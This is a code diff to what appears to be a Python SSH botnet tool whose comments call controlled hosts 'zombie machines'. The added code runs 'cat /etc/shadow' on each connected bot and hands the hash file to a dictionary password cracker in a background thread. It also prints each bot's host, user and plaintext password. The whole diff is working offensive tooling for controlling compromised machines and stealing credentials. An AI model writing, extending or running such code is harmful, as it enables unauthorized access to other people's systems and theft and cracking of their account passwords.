@@ -4,8 +4,12 @@ __author__ = "riverchu"
 
 import json
 import optparse
+import threading
 import pexpect
 from pexpect import pxssh
+
+import global_var as gv
+import brute.bruteUnixPasswd as bruteUnixPasswd
 
 
 class BotClient:
@@ -33,6 +37,16 @@ class BotClient:
 
         self.session = None
         self.connected = False
+
+        self.password_json = None
+
+    def __str__(self):
+        host_str = '[+]host: ' + self.host + '\n'
+        user_str = '[+]user: ' + self.user + '\n'
+        type_str = '[+]type: ' + self.ssh_type + '\n'
+        key_str = '[+]password: ' + self.passwd + '\n'
+
+        return host_str + user_str + type_str + key_str + '\n'
 
     def close(self):
         """关闭连接"""
@@ -174,18 +188,46 @@ class BotClient:
 
         return self.connected
 
-    def __str__(self):
-        host_str = '[+]host: ' + self.host + '\n'
-        user_str = '[+]user: ' + self.user + '\n'
-        type_str = '[+]type: ' + self.ssh_type + '\n'
-        key_str = '[+]password: ' + self.passwd + '\n'
+    def get_unix_passwdfile(self):
+        """获取密码文件
 
-        return host_str + user_str + type_str + key_str + '\n'
+        :return: 密码文件内容
+        """
+        cmd_getpass = 'cat /etc/shadow'
+        passwd_file_info = self.send_command(cmd_getpass)
+        return passwd_file_info
+
+    def crack_unix_passwd(self, passwd_file_info):
+        self.password_json = bruteUnixPasswd.crack_bot_unix_passwd(ip=self.host, passwd_file_info=passwd_file_info,
+                                                                   dic=gv.PASS_DICTIONARY)
+
+    def standard_operate(self):
+        """肉鸡标准操作
+
+        :return:
+        """
+        if self.connected is False:
+            return
+
+        # 获取unix密码
+        passwd_file_info = self.get_unix_passwdfile()
+        t = threading.Thread(target=self.crack_unix_passwd, args=(passwd_file_info,))
+
+        self.close()
+        t.start()
+        t.join()
 
 
 class BotNet:
     def __init__(self):
         self.botnet = []
+
+    def __str__(self):
+        string = '[+]Bot info:' + '\n'
+        for bot in self.botnet:
+            string += str(bot)
+
+        return string
 
     def add_bot(self, host, user, *, ssh_type='password', key=None):
         bot = BotClient(host=host, user=user, ssh_type=ssh_type, key=key)
@@ -230,13 +272,6 @@ class BotNet:
                 passwd = botnet_info[bot]['account'][user]['password']
 
                 self.add_bot(host=host, user=user, key=passwd)
-
-    def __str__(self):
-        string = '[+]Bot info:'+'\n'
-        for bot in self.botnet:
-            string += str(bot)
-
-        return string
 
 
 def main():
